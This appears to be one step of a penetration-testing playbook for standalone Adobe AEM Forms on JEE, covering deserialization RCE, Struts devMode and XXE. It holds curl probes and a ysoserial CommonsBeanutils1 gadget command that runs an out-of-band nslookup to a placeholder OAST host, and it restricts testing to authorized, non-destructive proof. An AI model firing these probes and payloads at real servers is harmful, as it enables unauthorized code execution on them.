# Batch 14 — Forms new big bugs (Shah / Assetnote)

## GOAL
On standalone Forms, check modern unauth critical doors. **OOB first.** Only if RCE/XXE allowed.

## TIME
~1–2 hours

## YOU NEED
- Batch 12: standalone smell  
- OAST  
- RCE in scope  

---

## WHY (30 seconds)

2025 research: standalone Forms on JEE left doors like:

1. **GetDocumentServlet** — bad Java deserialize (`serDoc`) → command run  
2. **adminui** + Struts **devMode** left on → code eval after auth filter fail  
3. Web service **XXE**

Internet-facing Forms is often “forgot this is critical.” You check doors, then prove with DNS ping to yourself — not disk wipe.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) Is FormServer servlet there?

```bash
curl -sk -D- -o /tmp/fs -w "code:%{http_code}\n" \
  "$T/FormServer/servlet/GetDocumentServlet" | head -20
head -c 200 /tmp/fs; echo
```

If live and RCE allowed: build gadget offline (authorized lab only):

```bash
# Research chain: CommonsBeanutils1 + properXalan, then gzip | base64
java -DproperXalan=true -jar ysoserial-all.jar CommonsBeanutils1 "nslookup YOUR-OAST" \
  | gzip | base64 -w0
# GET /FormServer/servlet/GetDocumentServlet?serDoc=<url-encoded output>
```

Use **OAST-only** commands. No destructive payloads.

### 2) adminui open?

```bash
for p in /adminui/ /adminui/login.do /adminui/debug; do
  curl -sk -o /tmp/a -w "%{http_code} %{size_download} $p\n" "$T$p"
done
```

Unauth debug/OGNL-looking responses = stop and document carefully.

### 3) edcws present?

```bash
curl -sk "$T/edcws/" | head -c 400; echo
```

XXE tests = OOB entity to YOUR-OAST only in this pass.

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| OOB RCE | Critical report. Stop noisy testing |
| Doors open, exploit fails | Report exposure + “patch Forms” |
| Not standalone | You should not be here → **15** |

---

## NEXT
→ [15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)
